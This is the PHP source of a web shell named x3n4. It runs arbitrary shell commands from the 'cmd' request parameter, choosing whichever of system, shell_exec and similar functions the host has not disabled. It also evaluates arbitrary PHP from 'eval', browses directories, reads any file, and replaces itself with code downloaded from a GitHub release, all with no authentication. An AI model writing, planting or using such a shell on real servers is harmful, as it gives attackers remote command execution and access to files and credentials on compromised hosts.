<?php

// error_reporting(0);

define('X3N4_VERSION', 'v0.2.0-alpha');

session_start();

/**
 * Functions
 */
function get_shell_prefix()
{
    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $ ';
}

function get_shell_command()
{
    static $shell_command;

    if ($shell_command === null) {
        if (is_callable('system') && !is_function_disabled('system')) {
            $shell_command = 'system';
        } elseif (is_callable('shell_exec') && !is_function_disabled('shell_exec')) {
            $shell_command = 'shell_exec';
        } elseif (is_callable('exec') && !is_function_disabled('exec')) {
            $shell_command = 'exec';
        } elseif (is_callable('passthru') && !is_function_disabled('passthru')) {
            $shell_command = 'passthru';
        } elseif (is_callable('proc_open') && !is_function_disabled('proc_open')) {
            $shell_command = 'proc_open';
        } elseif (is_callable('popen') && !is_function_disabled('popen')) {
            $shell_command = 'popen';
        } else {
            $shell_command = false;
        }
    }

    return $shell_command;
}

function execute_command($command)
{
    switch (get_shell_command()) {
        case 'system':
            ob_start();
            @system($command);
            $return = ob_get_contents();
            ob_end_clean();
            return $return;

        case 'shell_exec':
            return @shell_exec($command);

        case 'exec':
            return @exec($command);

        default:
            return 'None available function to run your command, sorry. :(';
    }
}

function disabled_functions()
{
    static $disabled_fn;

    if ($disabled_fn === null) {
        $df = ini_get('disable_functions');
        $shfb = ini_get('suhosin.executor.func.blacklist');
        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
    }

    return $disabled_fn;
}

function is_function_disabled($function)
{
    return in_array($function, disabled_functions());
}

function auto_update()
{
    $options  = array('http' => array('user_agent' => 'custom user agent string'));
    $context  = stream_context_create($options);
    $releases = @json_decode(@file_get_contents('https://api.github.com/repos/jorge-matricali/x3n4/releases', false, $context));
    if ($releases) {
        $asset = $releases[0]->assets[0]->browser_download_url;
        if ($asset) {
            file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
            file_put_contents(__FILE__, file_get_contents($asset, false, $context));
        }
    }
}

function list_folder_files($dir)
{
    $files = scandir($dir);
    $data = array();
    foreach ($files as $file) {
        $fpath = $dir . DIRECTORY_SEPARATOR . $file;
        $mtime = filemtime($fpath);
        array_push($data, array(
            'filename' => $file,
            'type' => is_dir($fpath) ? 'folder' : 'file',
            'fullpath' => realpath($fpath),
            'size' => is_dir($fpath) ? 0 : filesize($fpath),
            'permissions' => file_permissions($fpath),
            'modifiedAt' => ($mtime ? @date('c', $mtime) : '')
        ));
    }
    return $data;
}

function file_permissions($filename)
{
    $p = fileperms($filename);
    if (($p & 0xC000) == 0xC000) { // Socket
        $i = 's';
    } elseif (($p & 0xA000) == 0xA000) { // Enlace Simbólico
        $i = 'l';
    } elseif (($p & 0x8000) == 0x8000) { // Regular
        $i = '-';
    } elseif (($p & 0x6000) == 0x6000) { // Especial Bloque
        $i = 'b';
    } elseif (($p & 0x4000) == 0x4000) { // Directorio
        $i = 'd';
    } elseif (($p & 0x2000) == 0x2000) { // Especial Carácter
        $i = 'c';
    } elseif (($p & 0x1000) == 0x1000) { // Tubería FIFO
        $i = 'p';
    } else { // Desconocido
        $i = 'u';
    }

    // Propietario
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));

    // Grupo
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));

    // Mundo
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));

    return $i;
}

function output_json($output = '')
{
    $output_data = array(
        'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
        'banner' => get_shell_prefix(),
    );
    if (is_array($output)) {
        $output_data = array_merge($output_data, $output);
    } else {
        $output_data['stdout'] = $output;
    }
    if (is_callable('json_encode')) {
        header('Content-Type: application/json;');
        echo json_encode($output_data);
    } else {
        echo $output_data['banner'], ' ', $_REQUEST['cmd'], PHP_EOL, $output;
    }
    session_write_close();
    exit(0);
}

/**
 * CORE
 */
if (!empty($_SESSION['pwd'])) {
    chdir($_SESSION['pwd']);
}

if (isset($_REQUEST['cmd'])) {
    $REQUESTED_CMD = trim($_REQUEST['cmd']);
    if (empty($REQUESTED_CMD)) {
        exit(0);
    }
    if ($REQUESTED_CMD == 'dirl') {
        output_json(list_folder_files('.'));
    }
    if ($REQUESTED_CMD == 'upgrade') {
        auto_update();
        output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
        exit(0);
    }
    if ($REQUESTED_CMD == 'exit') {
        session_destroy();
        exit(0);
    }
    if (substr($_REQUEST['cmd'], 0, 3) === 'cd ') {
        $dir = substr($_REQUEST['cmd'], 3);
        $dir = realpath($dir);
        if (chdir($dir)) {
            $_SESSION['pwd'] = $dir;
            output_json();
        }
    }

    $output = execute_command($_REQUEST['cmd'] . ' 2>&1');
    output_json($output);
}

if (isset($_REQUEST['eval'])) {
    $t1 = microtime(true);
    ob_start();
    $output = @eval(stripslashes($_REQUEST['eval']));
    $output .= ob_get_contents();
    ob_end_clean();
    $t2 = microtime(true);
    output_json(array(
        'stdout' => $output,
        'took' => round($t2 - $t1, 2),
    ));
}

/**
 * File Manager
 */
if (isset($_REQUEST['dir'])) {
    $t1 = microtime(true);
    $directory = realpath(trim($_REQUEST['dir']));
    $output = list_folder_files($directory);
    $t2 = microtime(true);
    output_json(array(
        'path' => $directory,
        'isWritable' => @is_writable(realpath($directory)),
        'files' => $output,
        'took' => round($t2 - $t1, 2),
    ));
}
if (isset($_REQUEST['file'])) {
    $t1 = microtime(true);
    $filepath = realpath(trim($_REQUEST['file']));
    $output = file_get_contents($filepath);
    $t2 = microtime(true);
    output_json(array(
        'path' => $filepath,
        'content' => $output,
        'took' => round($t2 - $t1, 2),
    ));
}
